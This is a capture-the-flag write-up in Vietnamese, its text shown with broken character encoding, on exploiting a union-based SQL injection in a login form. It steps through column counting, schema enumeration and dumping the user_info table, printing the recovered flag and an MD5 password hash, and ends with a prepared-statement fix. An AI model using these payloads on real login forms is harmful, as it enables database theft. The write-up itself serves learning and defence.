## **ðŸ“Œ Má»¥c Lá»¥c**
1. [PhÃ¡t hiá»‡n lá»— há»•ng](#1-phÃ¡t-hiá»‡n-lá»—-há»•ng)
2. [XÃ¡c Ä‘á»‹nh sá»‘ lÆ°á»£ng cá»™t](#2-xÃ¡c-Ä‘á»‹nh-sá»‘-lÆ°á»£ng-cá»™t)
3. [XÃ¡c Ä‘á»‹nh cá»™t hiá»ƒn thá»‹](#3-xÃ¡c-Ä‘á»‹nh-cá»™t-hiá»ƒn-thá»‹)
4. [Khai thÃ¡c thÃ´ng tin database](#4-khai-thÃ¡c-thÃ´ng-tin-database)
5. [Khai thÃ¡c cáº¥u trÃºc báº£ng](#5-khai-thÃ¡c-cáº¥u-trÃºc-báº£ng)
6. [Khai thÃ¡c dá»¯ liá»‡u](#6-khai-thÃ¡c-dá»¯-liá»‡u)
7. [PhÃ¢n tÃ­ch káº¿t quáº£](#7-phÃ¢n-tÃ­ch-káº¿t-quáº£)
8. [Káº¿t luáº­n](#8-káº¿t-luáº­n)

---

## **1. PhÃ¡t hiá»‡n lá»— há»•ng**

### **1.1. Kiá»ƒm tra SQL Injection cÆ¡ báº£n**

**Payload:**
```sql
' UNION SELECT 1,2,3,4,5-- -
```

**Káº¿t quáº£:** Trang bÃ¡o lá»—i â†’ PhÃ¡t hiá»‡n cÃ³ thá»ƒ sá»‘ cá»™t khÃ´ng Ä‘Ãºng.

### **1.2. Äiá»u chá»‰nh sá»‘ cá»™t**

**Payload:**
```sql
' UNION SELECT 1,2,3,4-- -
```

**Káº¿t quáº£:** Login thÃ nh cÃ´ng vÃ  hiá»ƒn thá»‹ `Hello, 2!`

**PhÃ¢n tÃ­ch:**
- á»¨ng dá»¥ng cÃ³ **4 cá»™t** trong query gá»‘c
- Cá»™t sá»‘ **2** Ä‘Æ°á»£c hiá»ƒn thá»‹ trá»±c tiáº¿p ra mÃ n hÃ¬nh
- CÃ³ thá»ƒ khai thÃ¡c Union-based SQL Injection

---

## **2. XÃ¡c Ä‘á»‹nh sá»‘ lÆ°á»£ng cá»™t**

### **2.1. DÃ¹ng ORDER BY**
```sql
' ORDER BY 1-- -  (OK)
' ORDER BY 2-- -  (OK)
' ORDER BY 3-- -  (OK)
' ORDER BY 4-- -  (OK)
' ORDER BY 5-- -  (Lá»—i)
```

**Káº¿t luáº­n:** Query gá»‘c sá»­ dá»¥ng **4 cá»™t**.

### **2.2. XÃ¡c nháº­n vá»›i NULL**
```sql
' UNION SELECT NULL,NULL,NULL,NULL-- -  (OK)
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- - (Lá»—i)
```

**Káº¿t luáº­n:** ChÃ­nh xÃ¡c 4 cá»™t.

---

## **3. XÃ¡c Ä‘á»‹nh cá»™t hiá»ƒn thá»‹**

### **3.1. Test tá»«ng cá»™t**
```sql
' UNION SELECT 1,2,3,4-- -
```

**Káº¿t quáº£:** `Hello, 2!`

**PhÃ¢n tÃ­ch:** Chá»‰ cÃ³ cá»™t sá»‘ 2 Ä‘Æ°á»£c hiá»ƒn thá»‹ dá»¯ liá»‡u.

### **3.2. XÃ¡c Ä‘á»‹nh phiÃªn báº£n database**
```sql
' UNION SELECT 1,@@version,3,4-- -
```

**Káº¿t quáº£:** `Hello, 9.6.0!`

**ThÃ´ng tin:** MySQL version 9.6.0

---

## **4. Khai thÃ¡c thÃ´ng tin database**

### **4.1. Láº¥y tÃªn database hiá»‡n táº¡i**
```sql
' UNION SELECT 1,database(),3,4-- -
```

### **4.2. Liá»‡t kÃª cÃ¡c báº£ng**
```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Káº¿t quáº£:** `Hello, user_info!`

**PhÃ¢n tÃ­ch:** PhÃ¡t hiá»‡n báº£ng `user_info`

### **4.3. Äáº¿m sá»‘ lÆ°á»£ng báº£ng**
```sql
' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Káº¿t quáº£:** `Hello, 1!` â†’ Chá»‰ cÃ³ 1 báº£ng `user_info`

---

## **5. Khai thÃ¡c cáº¥u trÃºc báº£ng user_info**

### **5.1. Äáº¿m sá»‘ cá»™t trong báº£ng**
```sql
' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.columns WHERE table_name='user_info'-- -
```

**Káº¿t quáº£:** `Hello, 4!` â†’ Báº£ng cÃ³ 4 cá»™t

### **5.2. XÃ¡c Ä‘á»‹nh tÃªn cÃ¡c cá»™t**

**Cá»™t 1:**
```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 0,1-- -
```
â†’ **id**

**Cá»™t 2:**
```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 1,1-- -
```
â†’ **name**

**Cá»™t 3:**
```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 2,1-- -
```
â†’ **uname** (username)

**Cá»™t 4:**
```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 3,1-- -
```
â†’ **pwd** (password)

### **5.3. Cáº¥u trÃºc báº£ng hoÃ n chá»‰nh**
```sql
user_info (
    id INT,
    name VARCHAR,
    uname VARCHAR,
    pwd VARCHAR
)
```

---

## **6. Khai thÃ¡c dá»¯ liá»‡u**

### **6.1. Kiá»ƒm tra dá»¯ liá»‡u trong báº£ng**
```sql
' UNION SELECT 1,'has data',3,4 FROM user_info LIMIT 1-- -
```
â†’ `Hello, has data!` â†’ Báº£ng cÃ³ dá»¯ liá»‡u

### **6.2. Äáº¿m sá»‘ dÃ²ng**
```sql
' UNION SELECT 1,CONCAT('Row count: ', COUNT(*)),3,4 FROM user_info-- -
```
â†’ `Row count: 132` â†’ 132 tÃ i khoáº£n

### **6.3. Láº¥y dÃ²ng Ä‘áº§u tiÃªn**
```sql
' UNION SELECT 1,CONCAT(id, ' | ', name, ' | ', uname, ' | ', pwd),3,4 FROM user_info LIMIT 0,1-- -
```

**Káº¿t quáº£:**
```
Hello, 1 | BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1} | teebow1e | 521b04082eb661f55a5152dfdfce3844!
```

### **6.4. PhÃ¢n tÃ­ch dá»¯ liá»‡u thu Ä‘Æ°á»£c**

| Cá»™t | GiÃ¡ trá»‹ |
|-----|---------|
| id | 1 |
| name | **BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1}** (FLAG) |
| uname | teebow1e |
| pwd | 521b04082eb661f55a5152dfdfce3844 (MD5 hash) |

---

## **7. PhÃ¢n tÃ­ch káº¿t quáº£**

### **7.1. Flag tÃ¬m Ä‘Æ°á»£c**
```
BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1}
```


## **8. Káº¿t luáº­n**

### **8.1. TÃ³m táº¯t quÃ¡ trÃ¬nh khai thÃ¡c**
1. **PhÃ¡t hiá»‡n:** SQL Injection qua trÆ°á»ng login
2. **XÃ¡c Ä‘á»‹nh sá»‘ cá»™t:** 4 cá»™t vá»›i ORDER BY vÃ  UNION SELECT NULL
3. **XÃ¡c Ä‘á»‹nh cá»™t hiá»ƒn thá»‹:** Cá»™t sá»‘ 2 hiá»ƒn thá»‹ dá»¯ liá»‡u
4. **XÃ¡c Ä‘á»‹nh phiÃªn báº£n:** MySQL 9.6.0
5. **Khai thÃ¡c database:** TÃ¬m Ä‘Æ°á»£c báº£ng `user_info`
6. **Khai thÃ¡c cáº¥u trÃºc:** 4 cá»™t: id, name, uname, pwd
7. **Khai thÃ¡c dá»¯ liá»‡u:** Láº¥y Ä‘Æ°á»£c flag tá»« dÃ²ng Ä‘áº§u tiÃªn

### **8.2. BÃ i há»c rÃºt ra**
- **Input validation** lÃ  cá»±c ká»³ quan trá»ng
- **Prepared statements** cáº§n Ä‘Æ°á»£c sá»­ dá»¥ng thay vÃ¬ dynamic query
- **Principle of least privilege** cho database user
- **Error messages** khÃ´ng nÃªn hiá»ƒn thá»‹ chi tiáº¿t cho ngÆ°á»i dÃ¹ng

### **8.3. Kháº¯c phá»¥c lá»— há»•ng**
```php
// Thay vÃ¬:
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

// Sá»­ dá»¥ng Prepared Statement:
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

---

## **ðŸ“Š Flowchart khai thÃ¡c**

```
Start
  â†“
PhÃ¡t hiá»‡n SQL Injection
  â†“
XÃ¡c Ä‘á»‹nh sá»‘ cá»™t (4)
  â†“
XÃ¡c Ä‘á»‹nh cá»™t hiá»ƒn thá»‹ (cá»™t 2)
  â†“
Láº¥y version (MySQL 9.6.0)
  â†“
Liá»‡t kÃª báº£ng (user_info)
  â†“
Liá»‡t kÃª cá»™t (id, name, uname, pwd)
  â†“
Khai thÃ¡c dá»¯ liá»‡u
  â†“
[FLAG] BKSEC{...}
  â†“
End
```
